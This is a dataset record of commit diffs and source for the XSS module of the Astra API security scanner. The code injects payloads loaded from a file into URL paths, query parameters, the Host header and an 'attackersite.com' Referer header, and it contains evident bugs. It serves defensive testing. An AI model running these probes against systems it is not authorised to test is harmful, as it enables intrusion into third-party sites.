temp_headers.update(headers)\n+    xss_payloads = fetch_xss_payload()\n+    for payload in xss_payloads:\n+        parse_domain = urlparse.urlparse(url).netloc\n+        host_header = {\"Host\" : parse_domain + '/' + payload}\n+        headers.update(host_header)\n+        host_header_xss = req.api_request(url, \"GET\", headers)\n+        if host_header_xss.text.find(payload) != -1:\n+            impact = \"Low\"\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            dbupdate.insert_record(xss_http_headers)\n+            break\n+\n+    # Test for Referer based XSS \n+    for payload in xss_payloads:\n+        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header = {\"Referer\" : referer_header_value}\n+        temp_headers.update(referer_header)\n+        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n+        if ref_header_xss.text.find(payload) != -1:\n+            impact = check_xss_impact(temp_headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n+            break\n+\n+\n def xss_get_url(url,method,headers,body,scanid=None):\n-    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n-    xss_result = ''\n+    # Check for URL based XSS. \n+    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n+    result = ''\n     xss_payloads = fetch_xss_payload()\n     uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n     for uri_list in uri_check_list:\n", "add": 36, "remove": 2, "filename": "/modules/xss.py", "badparts": ["    xss_result = ''"], "goodparts": ["def xss_http_headers(url,method,headers,body,scanid=None):", "    temp_headers = {}", "    temp_headers.update(headers)", "    xss_payloads = fetch_xss_payload()", "    for payload in xss_payloads:", "        parse_domain = urlparse.urlparse(url).netloc", "        host_header = {\"Host\" : parse_domain + '/' + payload}", "        headers.update(host_header)", "        host_header_xss = req.api_request(url, \"GET\", headers)", "        if host_header_xss.text.find(payload) != -1:", "            impact = \"Low\"", "            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}", "            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)", "            dbupdate.insert_record(xss_http_headers)", "            break", "    for payload in xss_payloads:", "        referer_header_value = 'http://attackersite.com?test='+payload", "        referer_header = {\"Referer\" : referer_header_value}", "        temp_headers.update(referer_header)", "        ref_header_xss = req.api_request(url, \"GET\", temp_headers)", "        if ref_header_xss.text.find(payload) != -1:", "            impact = check_xss_impact(temp_headers)", "            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)", "            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}", "            dbupdate.insert_record(attack_result)", "            break", "    result = ''"]}, {"diff": "\n \n     for payload in xss_payloads:\n             xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact(xss_request_url.headers)\n-                xss_result = True\n+            if result is not True:\n+                if xss_request_url.text.find(payload) != -1:\n+                    impact = check_xss_impact(xss_request_url.headers)\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+                    dbupdate.insert_record(attack_result)\n+                    result = True\n \n             xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n             if xss_request_url.text.find(payload) != -1:\n                 impact = check_xss_impact()\n-                xss_result = True\n-\n-            if xss_result is True:\n                 print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n-                return\n+                \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n-    # Test for XSS in GET param\n+    # This function checks for URI based XSS. \n+    # http://localhost/?firstname=<payload>&lastname=<payload>\n     db_update = ''\n     vul_param = ''\n     url_query = urlparse.urlparse(url)\n", "add": 10, "remove": 9, "filename": "/modules/xss.py", "badparts": ["            if xss_request_url.text.find(payload) != -1:", "                impact = check_xss_impact(xss_request_url.headers)", "                xss_result = True", "                xss_result = True", "            if xss_result is True:", "                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}", "                return"], "goodparts": ["            if result is not True:", "                if xss_request_url.text.find(payload) != -1:", "                    impact = check_xss_impact(xss_request_url.headers)", "                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}", "                    dbupdate.insert_record(attack_result)", "                    result = True", "                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}"]}, {"diff": "\n                     # check for URI based XSS\n                     # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                     if result is not True:\n-                        print \"param to test\",key\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        print xss_request.text\n                         if xss_request.text.find(payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n", "add": 0, "remove": 2, "filename": "/modules/xss.py", "badparts": ["                        print \"param to test\",key", "                        print xss_request.text"], "goodparts": []}, {"diff": "\n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n-        print \"all params\",vul_param\n+        if vul_param:\n+            # Update all vulnerable params to db.\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n", "add": 3, "remove": 1, "filename": "/modules/xss.py", "badparts": ["        print \"all params\",vul_param"], "goodparts": ["        if vul_param:", "            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})"]}], "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) ", "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    xss_result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                xss_result = True\n\n            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact()\n                xss_result = True\n\n            if xss_result is True:\n                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                dbupdate.insert_record(attack_result)\n                return\n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        print \"param to test\",key\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        print xss_request.text\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        print \"all params\",vul_param\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n        #xss_http_headers(url,method,headers,body,scanid)"}}, "msg": "changes in xss_http_headers function"}, "1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1": {"url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1", "html_url": "https://github.com/flipkart-incubator/Astra/commit/1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1", "sha": "1611d2eb1cf40451f5c99ba6dc146d3ab11a54a1", "keyword": "XSS change", "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 36137f2..93dafcb 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -3,6 +3,7 @@\n import sendrequest as req\n import utils.logs as logs\n import urlparse\n+import time\n \n from utils.logger import logger\n from utils.db import Database_update\n@@ -29,7 +30,7 @@ def fetch_xss_payload():\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n@@ -40,9 +41,43 @@ def check_xss_impact(res_headers):\n     return impact\n \n \n+def xss_http_headers(url,method,headers,body,scanid=None):\n+    # This function checks different header based XSS.\n+    # XSS via Host header (Limited to IE)\n+    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n+    temp_headers = {}\n+    temp_headers.update(headers)\n+    xss_payloads = fetch_xss_payload()\n+    for payload in xss_payloads:\n+        parse_domain = urlparse.urlparse(url).netloc\n+        host_header = {\"Host\" : parse_domain + '/' + payload}\n+        headers.update(host_header)\n+        host_header_xss = req.api_request(url, \"GET\", headers)\n+        if host_header_xss.text.find(payload) != -1:\n+            impact = \"Low\"\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            dbupdate.insert_record(xss_http_headers)\n+            break\n+\n+    # Test for Referer based XSS \n+    for payload in xss_payloads:\n+        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header = {\"Referer\" : referer_header_value}\n+        temp_headers.update(referer_header)\n+        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n+        if ref_header_xss.text.find(payload) != -1:\n+            impact = check_xss_impact(temp_headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n+            break\n+\n+\n def xss_get_url(url,method,headers,body,scanid=None):\n-    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n-    xss_result = ''\n+    # Check for URL based XSS. \n+    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n+    result = ''\n     xss_payloads = fetch_xss_payload()\n     uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n     for uri_list in uri_check_list:\n@@ -56,23 +91,24 @@ def xss_get_url(url,method,headers,body,scanid=None):\n \n     for payload in xss_payloads:\n             xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact(xss_request_url.headers)\n-                xss_result = True\n+            if result is not True:\n+                if xss_request_url.text.find(payload) != -1:\n+                    impact = check_xss_impact(xss_request_url.headers)\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+                    dbupdate.insert_record(attack_result)\n+                    result = True\n \n             xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n             if xss_request_url.text.find(payload) != -1:\n                 impact = check_xss_impact()\n-                xss_result = True\n-\n-            if xss_result is True:\n                 print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n-                return\n+                \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n-    # Test for XSS in GET param\n+    # This function checks for URI based XSS. \n+    # http://localhost/?firstname=<payload>&lastname=<payload>\n     db_update = ''\n     vul_param = ''\n     url_query = urlparse.urlparse(url)\n@@ -87,11 +123,9 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n                     # check for URI based XSS\n                     # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                     if result is not True:\n-                        print \"param to test\",key\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        print xss_request.text\n                         if xss_request.text.find(payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n@@ -111,7 +145,9 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n-        print \"all params\",vul_param\n+        if vul_param:\n+            # Update all vulnerable params to db.\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n@@ -119,4 +155,5 @@ def xss_check(url,method,headers,body,scanid):\n     if method == 'GET' or method == 'DEL':\n         xss_get_uri(url,method,headers,body,scanid)\n         xss_get_url(url,method,headers,body,scanid)\n-        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    \n+    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n", "message": "", "files": {"/modules/xss.py": {"changes": [{"diff": "\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n", "add": 1, "remove": 1, "filename": "/modules/xss.py", "badparts": ["        if 'application/json' or 'text/plain' in xss_request['Content-Type']:"], "goodparts": ["        if 'application/json' or 'text/plain' in res_headers['Content-Type']:"]}, {"diff": "\n     return impact\n \n \n+def xss_http_headers(url,method,headers,body,scanid=None):\n+    # This function checks different header based XSS.\n+    # XSS via Host header (Limited to IE)\n+    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n+    temp_headers = {}\n+    temp_headers.update(headers)\n+    xss_payloads = fetch_xss_payload()\n+    for payload in xss_payloads:\n+        parse_domain = urlparse.urlparse(url).netloc\n+        host_header = {\"Host\" : parse_domain + '/' + payload}\n+        headers.update(host_header)\n+        host_header_xss = req.api_request(url, \"GET\", headers)\n+        if host_header_xss.text.find(payload) != -1:\n+            impact = \"Low\"\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            dbupdate.insert_record(xss_http_headers)\n+            break\n+\n+    # Test for Referer based XSS \n+    for payload in xss_payloads:\n+        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header = {\"Referer\" : referer_header_value}\n+        temp_headers.update(referer_header)\n+        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n+        if ref_header_xss.text.find(payload) != -1:\n+            impact = check_xss_impact(temp_headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n+            break\n+\n+\n def xss_get_url(url,method,headers,body,scanid=None):\n-    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n-    xss_result = ''\n+    # Check for URL based XSS. \n+    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n+    result = ''\n     xss_payloads = fetch_xss_payload()\n     uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n     for uri_list in uri_check_list:\n", "add": 36, "remove": 2, "filename": "/modules/xss.py", "badparts": ["    xss_result = ''"], "goodparts": ["def xss_http_headers(url,method,headers,body,scanid=None):", "    temp_headers = {}", "    temp_headers.update(headers)", "    xss_payloads = fetch_xss_payload()", "    for payload in xss_payloads:", "        parse_domain = urlparse.urlparse(url).netloc", "        host_header = {\"Host\" : parse_domain + '/' + payload}", "        headers.update(host_header)", "        host_header_xss = req.api_request(url, \"GET\", headers)", "        if host_header_xss.text.find(payload) != -1:", "            impact = \"Low\"", "            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}", "            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)", "            dbupdate.insert_record(xss_http_headers)", "            break", "    for payload in xss_payloads:", "        referer_header_value = 'http://attackersite.com?test='+payload", "        referer_header = {\"Referer\" : referer_header_value}", "        temp_headers.update(referer_header)", "        ref_header_xss = req.api_request(url, \"GET\", temp_headers)", "        if ref_header_xss.text.find(payload) != -1:", "            impact = check_xss_impact(temp_headers)", "            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)", "            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}", "            dbupdate.insert_record(attack_result)", "            break", "    result = ''"]}, {"diff": "\n \n     for payload in xss_payloads:\n             xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact(xss_request_url.headers)\n-                xss_result = True\n+            if result is not True:\n+                if xss_request_url.text.find(payload) != -1:\n+                    impact = check_xss_impact(xss_request_url.headers)\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+                    dbupdate.insert_record(attack_result)\n+                    result = True\n \n             xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n             if xss_request_url.text.find(payload) != -1:\n                 impact = check_xss_impact()\n-                xss_result = True\n-\n-            if xss_result is True:\n                 print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n-                return\n+                \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n-    # Test for XSS in GET param\n+    # This function checks for URI based XSS. \n+    # http://localhost/?firstname=<payload>&lastname=<payload>\n     db_update = ''\n     vul_param = ''\n     url_query = urlparse.urlparse(url)\n", "add": 10, "remove": 9, "filename": "/modules/xss.py", "badparts": ["            if xss_request_url.text.find(payload) != -1:", "                impact = check_xss_impact(xss_request_url.headers)", "                xss_result = True", "                xss_result = True", "            if xss_result is True:", "                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}", "                return"], "goodparts": ["            if result is not True:", "                if xss_request_url.text.find(payload) != -1:", "                    impact = check_xss_impact(xss_request_url.headers)", "                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}", "                    dbupdate.insert_record(attack_result)", "                    result = True", "                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}"]}, {"diff": "\n                     # check for URI based XSS\n                     # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                     if result is not True:\n-                        print \"param to test\",key\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        print xss_request.text\n                         if xss_request.text.find(payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n", "add": 0, "remove": 2, "filename": "/modules/xss.py", "badparts": ["                        print \"param to test\",key", "                        print xss_request.text"], "goodparts": []}, {"diff": "\n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n-        print \"all params\",vul_param\n+        if vul_param:\n+            # Update all vulnerable params to db.\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n", "add": 